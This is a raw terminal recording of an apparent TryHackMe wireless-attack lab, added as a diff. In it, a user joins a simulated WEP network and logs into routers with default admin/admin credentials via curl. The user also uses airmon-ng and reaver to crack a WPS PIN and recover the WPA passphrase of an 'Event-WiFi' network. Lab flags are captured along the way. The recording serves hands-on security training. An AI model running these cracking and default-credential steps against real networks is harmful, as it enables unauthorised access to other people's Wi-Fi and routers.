@@ -1,0 +1,273 @@
+Script started on 2026-11-06 15:19:26+03:00 [COMMAND="ssh user@attacking.legacy.wi.fi.thm" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="119" LINES="29"]
+The authenticity of host 'attacking.legacy.wi.fi.thm (10.80.140.179)' can't be established.
+ED25519 key fingerprint is: SHA256:9mNrdFKOLyVrBIGiwPpn9l6Tz8HhTfaB7A1DXztmenU
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'attacking.legacy.wi.fi.thm' (ED25519) to the list of known hosts.
+user@attacking.legacy.wi.fi.thm's password: 
+Linux ip-10-80-140-179 6.1.0-23-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Sep 22 10:08:29 2026 from 192.168.128.181
+[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7mcat > homelegacy.conf <<EOF[27m
+[7mnetwork={[27m
+[7m    ssid="Home-Legacy"[27m
+[7m    key_mgmt=NONE[27m
+[7m    wep_key0=11BB33CD55[27m
+[7m    wep_tx_keyidx=0[27m
+[7m}[27m
+[7mEOF   [27m[A[A[A[A[A[A[A]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ cat > homelegacy.conf <<EOF
+network={
+    ssid="Home-Legacy"
+    key_mgmt=NONE
+    wep_key0=11BB33CD55
+    wep_tx_keyidx=0
+}
+EOF   
+[?2004l[?2004h> 
+[?2004l[?2004h> EOF
+[?2004l[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ ls
+[?2004l[0m[01;34mDesktop[0m    [01;34mengagement[0m       keystroke.log  [01;34mPublic[0m     [37;44mthinclient_drives[0m  [01;34mVideos[0m
+[01;34mDocuments[0m  events.log       [01;34mMusic[0m          README.md  [40;31;01mtools[0m              [01;34mwordlists[0m
+[01;34mDownloads[0m  homelegacy.conf  [01;34mPictures[0m       [01;34mTemplates[0m  user.log           wskeylogger.log
+[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ cat homelegacy.conf 
+[?2004lnetwork={
+    ssid="Home-Legacy"
+    key_mgmt=NONE
+    wep_key0=11BB33CD55
+    wep_tx_keyidx=0
+}
+EOF   
+
+[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ nano homelegacy.conf 
+[?2004l[?2004h[?1049h[22;0;0t[1;29r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[27;53H(B[0;7m[ Reading... ](B[m[27;52H(B[0;7m[ Read 8 lines ](B[m[H(B[0;7m  GNU nano 7.2                                        homelegacy.conf                                                  [1;118H(B[m[28d(B[0;7m^G(B[m Help[28;18H(B[0;7m^O(B[m Write Out     (B[0;7m^W(B[m Where Is[52G(B[0;7m^K(B[m Cut[28;69H(B[0;7m^T(B[m Execute[86G(B[0;7m^C(B[m Location[103G(B[0;7mM-U(B[m Undo[29d(B[0;7m^X(B[m Exit[29;18H(B[0;7m^R(B[m Read File     (B[0;7m^\(B[m Replace[52G(B[0;7m^U(B[m Paste[29;69H(B[0;7m^J(B[m Justify[86G(B[0;7m^/(B[m Go To Line    (B[0;7mM-E(B[m Redo[2dnetwork={[3;5Hssid="Home-Legacy"[4;5Hkey_mgmt=NONE[5;5Hwep_key0=11BB33CD55[6;5Hwep_tx_keyidx=0[7d}[8dEOF[2d[?12l[?25h[?25l[?12l[?25h[3d[?25l[?12l[?25h[4d[?25l[?12l[?25h[5d[?25l[?12l[?25h[6d[?25l[?12l[?25h[7d[?25l[?12l[?25h}[?25l[?12l[?25h[8d[?25l[?12l[?25h[7G[?25l[1;71H(B[0;7m*[118G(B[m[?12l[?25h[8;6H[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h [?25l[?12l[?25h [?25l[?12l[?25h[K[?25l[A}[?12l[?25h[?25l[27;52H (B[0;7m[ Writing... ](B[m[K[1;71H(B[0;7m [118G(B[m[27;52H(B[0;7m[ Wrote 7 lines ](B[m[?12l[?25h[7d}[?25l[27d[J[29d[?12l[?25h[29;1H[?1049l[23;0;0t[?1l>[?2004l[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7msudo wpa_supplicant -B -i wlan1 -c homelegacy.conf[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo wpa_supplicant -B -i wlan1 -c homelegacy.conf
+[?2004lSuccessfully initialized wpa_supplicant
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7msudo iw dev wlan1 link[27msudo iw dev wlan1 link
+[?2004lConnected to f0:9f:c2:71:22:11 (on wlan1)
+	SSID: Home-Legacy
+	freq: 2422
+	RX: 4793 bytes (105 packets)
+	TX: 868 bytes (33 packets)
+	signal: -30 dBm
+	tx bitrate: 54.0 MBit/s
+
+	bss flags:	short-slot-time
+	dtim period:	2
+	beacon int:	100
+[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7msudo dhclient -v wlan1[27msudo dhclient -v wlan1
+[?2004lInternet Systems Consortium DHCP Client 4.4.3-P1
+Copyright 2004-2022 Internet Systems Consortium.
+All rights reserved.
+For info, please visit https://www.isc.org/software/dhcp/
+
+Listening on LPF/wlan1/02:00:00:00:01:00
+Sending on   LPF/wlan1/02:00:00:00:01:00
+Sending on   Socket/fallback
+DHCPDISCOVER on wlan1 to 255.255.255.255 port 67 interval 5
+DHCPOFFER of 192.168.1.23 from 192.168.1.1
+DHCPREQUEST for 192.168.1.23 on wlan1 to 255.255.255.255 port 67
+DHCPACK of 192.168.1.23 from 192.168.1.1
+bound to 192.168.1.23 -- renewal in 33191 seconds.
+[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7mcurl -s -c cookies.txt -d "Username=admin&Password=admin&Submit=Submit" http://192.168.1.1/log[27m[7mi[27m[7mn.php -o /dev/null[27m[A]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ curl -s -c cookies.txt -d "Username=admin&Password=admin&Submit=Submit" http://192.168.1.1/login.php -o /dev/null
+[?2004l[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7mcurl -s -b cookies.txt http://192.168.1.1/index.php[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccurl -s -b cookies.txt http://192.168.1.1/index.php
+[?2004l<!DOCTYPE html>
+<html>
+<head>
+    <title>WiFi Router Configuration</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<script src="script.js"></script>
+
+<div class="content">
+
+Welcome admin<br><br>Flag: <button onclick="copyFlagToClipboard('THM{49cb83e8922d262916e8f0ae4914181231f07506}')">THM{49cb83e8922d262916e8f0ae4914181231f07506}</button><br><br>[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ 
+[?2004l[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7msudo airmon-ng start wlan0[27msudo airmon-ng start wlan0
+[?2004l
+Found 7 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+    492 dhclient
+    606 avahi-daemon
+    621 avahi-daemon
+    638 NetworkManager
+    646 wpa_supplicant
+  16915 wpa_supplicant
+  17570 dhclient
+
+PHY	Interface	Driver		Chipset
+
+phy2	wlan0		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
+		(mac80211 station mode vif disabled for [phy2]wlan0)
+phy3	wlan1		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy4	wlan2		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy5	wlan3		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy6	wlan4		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy7	wlan5		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy62	wlan60		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy64	wlan62		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy65	wlan63		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+
+[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7msudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -K -vv[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -K -vv
+[?2004l
+Reaver v1.6.6-git-25-gf9b5e15 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Switching wlan0mon to channel 8
+[+] Waiting for beacon from F0:9F:C2:71:22:13
+[+] Received beacon from F0:9F:C2:71:22:13
+[+] Trying pin "12345670"
+[+] Sending authentication request
+[+] Sending association request
+[+] Associated with F0:9F:C2:71:22:13 (ESSID: Event-WiFi)
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+executing pixiewps -e e3c79d979f3e7cf10f1cd4aff76e9c8c112589a2c682bff4a62e4d589f2777f88be1edf5d74f9824f7544ca1f8ecbefc85711d36c2d798a6348a4dabb088ec37ea022db2c971c3e5e3d88062e4e4b8229a175d1b88f808b5355c650108edff71d75a131e87f92b52dba94435837cdd0d8da02063d84120f626502452eb7c4c14aaa068f39703b26b9f6044a2272e65912e0197d4d163323d3ac7b2ca41ace5e8720f5461ba4757abdce861e9055bd1bdcc4c5e72a65e31a93779daeb4fa0c4d5 -s 709af304bf22c027839079fc948f3524986027ab77d032d8d7e5668f2c15c86d -z d5e0fd3542d80773a86618ece5acf7b4e16d3628105e723c47555dd49b85ab9f -a 71ae8c7277854756d822ade37d35926be67be63d4a2aaf1f3dfcd31aa3259134 -n c4854dd1f33e4be19d53d966a658b7c5 -r 6e069d9e9c32959820b372e8c01fb7720559e2adc1bf30c1e5c253583b1ba7ea551e908c95329f58a5d28673efd9395fef8449cd98372014f106c9724d942301cbf0b6897f33271c5547ae4827d06fec429198f094fde11309b1380b72e7db9b8fc287fa22c758d5bcd688ec159b7200b1b4a18b4e261e862d95aa98adb17117829aa3d1dea23b7ea11a9c603339e854ff28c428f8234aefc46944ba93fb81c8b4ab98a2c94f3cb8afd418507141eb065bd2a1b520639606dfc8f616b5906b18
+
+ Pixiewps 1.4
+
+ [-] WPS pin not found!
+
+ [*] Time taken: 0 s 263 ms
+
+[-] Pixiewps fail, sending WPS NACK
+[+] Sending WSC NACK
+[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7msudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv
+[?2004l
+Reaver v1.6.6-git-25-gf9b5e15 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Switching wlan0mon to channel 8
+[+] Waiting for beacon from F0:9F:C2:71:22:13
+[+] Received beacon from F0:9F:C2:71:22:13
+[+] Trying pin "12345670"
+[+] Sending authentication request
+[+] Sending association request
+[+] Associated with F0:9F:C2:71:22:13 (ESSID: Event-WiFi)
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received M5 message
+[+] Sending M6 message
+[+] Received M7 message
+[+] Sending WSC NACK
+[+] Sending WSC NACK
+[+] Pin cracked in 1 seconds
+[+] WPS PIN: '12345670'
+[+] WPA PSK: '@MegaPSKP@ssword!@'
+[+] AP SSID: 'Event-WiFi'
+[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7msudo pkill -f 'wpa_supplicant.*wlan1'[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo pkill -f 'wpa_supplicant.*wlan1'
+[?2004l[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7mwpa_passphrase Event-WiFi '@MegaPSKP@ssword!@' > event.conf[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwpa_passphrase Event-WiFi '@MegaPSKP@ssword!@' > event.conf
+[?2004l[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7msudo wpa_supplicant -B -i wlan1 -c event.conf[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo wpa_supplicant -B -i wlan1 -c event.conf
+[?2004lSuccessfully initialized wpa_supplicant
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+nl80211: kernel reports: Match already configured
+[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7msudo dhclient -v wlan1[27msudo dhclient -v wlan1
+[?2004lInternet Systems Consortium DHCP Client 4.4.3-P1
+Copyright 2004-2022 Internet Systems Consortium.
+All rights reserved.
+For info, please visit https://www.isc.org/software/dhcp/
+
+Listening on LPF/wlan1/02:00:00:00:01:00
+Sending on   LPF/wlan1/02:00:00:00:01:00
+Sending on   Socket/fallback
+DHCPREQUEST for 192.168.1.23 on wlan1 to 255.255.255.255 port 67
+DHCPREQUEST for 192.168.1.23 on wlan1 to 255.255.255.255 port 67
+DHCPNAK from 192.168.3.1
+DHCPDISCOVER on wlan1 to 255.255.255.255 port 67 interval 4
+DHCPOFFER of 192.168.3.23 from 192.168.3.1
+DHCPREQUEST for 192.168.3.23 on wlan1 to 255.255.255.255 port 67
+DHCPACK of 192.168.3.23 from 192.168.3.1
+bound to 192.168.3.23 -- renewal in 33878 seconds.
+[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7mcurl -s -c cookies.txt -d "Username=admin&Password=admin&Submit=Submit" http://192.168.3.1/log[27m[7mi[27m[7mn.php -o /dev/null[27m[A]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ curl -s -c cookies.txt -d "Username=admin&Password=admin&Submit=Submit" http://192.168.3.1/login.php -o /dev/null
+[?2004l[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ [7mcurl -s -b cookies.txt http://192.168.3.1/index.php[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccurl -s -b cookies.txt http://192.168.3.1/index.php
+[?2004l<!DOCTYPE html>
+<html>
+<head>
+    <title>WiFi Router Configuration</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<script src="script.js"></script>
+
+<div class="content">
+
+Welcome admin<br><br>Flag: <button onclick="copyFlagToClipboard('THM{e2c2fae28c90d2f73d733117ceb85cf28912bc3d}')">THM{e2c2fae28c90d2f73d733117ceb85cf28912bc3d}</button><br><br>[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ 
+[?2004l[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ 
+[?2004l[?2004h]0;user@ip-10-80-140-179: ~[01;32muser@ip-10-80-140-179[00m:[01;34m~[00m$ exit
+[?2004llogout
+Connection to attacking.legacy.wi.fi.thm closed.
+
+Script done on 2026-11-06 15:28:28+03:00 [COMMAND_EXIT_CODE="0"]
